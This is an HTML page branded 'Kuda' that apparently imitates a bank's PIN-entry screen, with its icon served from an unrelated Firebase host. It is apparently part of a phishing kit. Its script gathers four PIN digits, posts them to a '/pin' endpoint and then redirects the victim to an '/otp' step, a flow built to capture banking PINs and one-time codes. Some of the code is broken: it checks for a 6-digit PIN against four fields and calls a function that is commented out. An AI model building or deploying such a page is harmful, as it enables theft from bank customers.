<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="shortcut icon"
      href="https://younk-5b894.web.app/images/logo.png"
      type="image/x-icon"
    />
    <title>Kuda</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <!-- <link rel="stylesheet" href="/css/pin.css" /> -->
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;700;800&family=Roboto:wght@100;300;400;500;700;900&display=swap");
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Open Sans", sans-serif;
      }
      body {
        background: #fff;
      }

      .container {
        height: 100%;
        width: 100%;
        padding: 0 1em;
      }
      .contentSec {
        padding: 2em 0 0;
      }
      .title {
        font-size: 1.54em;
        font-weight: 500;
        color: #000;
        line-height: 1.3em;
      }
      .formSec {
        width: 100%;
        height: 80dvh;
        background: #fff;
        border-top-right-radius: 1.5em;
        border-top-left-radius: 1.5em;
        padding: 2em 0;
      }
      form {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 1em;
      }

      form input {
        width: 56px;
        height: 55px;
        outline: none;
        font-weight: 900;
        font-size: 2em;
        background: #fff;
        text-align: center;
        border: 1px solid rgba(0, 0, 0, 0.1);
        border-radius: 5px;
        box-shadow: 0 2px 2px rgba(0, 0, 0, 0.1);
      }

      .input {
        padding-bottom: 0;
        padding-top: 0;
      }

      .buttonSec {
        display: flex;
        justify-content: center;
        padding-top: 2em;
      }

      button {
        width: 100%;
        height: 3rem;
        border-radius: 3px;
        outline: none;
        border: none;
        font-size: 1.2em;
        font-weight: 600;
        background: #411b69;
        color: #fff;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="contentSec">
        <div class="title">Enter PIN to continue</div>
      </div>
      <div class="formSec">
        <div class="input">
          <form method="post">
            <input
              type="password"
              id="digit1"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
            />
            <input
              type="password"
              id="digit2"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
            />
            <input
              type="password"
              id="digit3"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
            />
            <input
              type="password"
              id="digit4"
              class="pin-input"
              oninput="this.value = this.value.replace(/[^0-9]/g, '')"
              inputmode="numeric"
              pattern="[0-9]*"
            />
          </form>
        </div>

        <div class="buttonSec">
          <button id="submitBtn" type="submit">Next</button>
        </div>
      </div>
    </div>
    <!-- <script src="/js/app.pin.js"></script> -->
    <script>
      const otpForm = document.querySelector(".otpForm");
      const btn = document.querySelector("button");
      // Function to check if the input is a valid 6-digit PIN
      function isValidPIN(pin) {
        return /^\d{6}$/.test(pin);
      }

      // Function to change the button color
      // function changeButtonColor(isFocused) {
      //   var submitBtn = document.getElementById("submitBtn");
      //   submitBtn.style.backgroundColor = isFocused ? "#0361f0" : ""; // Change the color as needed
      //   submitBtn.style.color = isFocused ? "#fff" : ""; // Change the color as needed
      // }

      // Add event listeners to move the cursor to the next input field
      var pinInputs = document.getElementsByClassName("pin-input");

      for (var i = 0; i < pinInputs.length; i++) {
        pinInputs[i].addEventListener("input", function () {
          if (this.value.length === 1) {
            var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
            if (nextInputIndex < pinInputs.length) {
              pinInputs[nextInputIndex].focus();
            } else {
              changeButtonColor(true); // Focus is on the last input
            }
          }
        });
      }

      // Add an event listener to reset the button color when any input loses focus
      for (var i = 0; i < pinInputs.length; i++) {
        pinInputs[i].addEventListener("blur", function () {
          changeButtonColor(false);
        });
      }

      /// Loading in button
      btn.onclick = () => {
        btn.disabled = true;
        btn.innerHTML = "Loading...";
      };

      // Function to collect and validate the PIN when the Submit button is clicked
      document
        .getElementById("submitBtn")
        .addEventListener("click", function () {
          var pin = "";
          var pinInputs = document.getElementsByClassName("pin-input");

          for (var i = 0; i < pinInputs.length; i++) {
            pin += pinInputs[i].value;
          }

          let formData = {
            pin: pin,
          };
          const handleFetchForm = async (res, req) => {
            const request = await fetch("/pin", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(formData),
            });
            const response = await request.text();
            console.log(request.statusText);
            console.log(response);
            if (response == "success") {
              pin = "";
              location.href = "/otp";
            } else {
              console.log("error");
            }
          };
          handleFetchForm();
        });
    </script>
  </body>
</html>
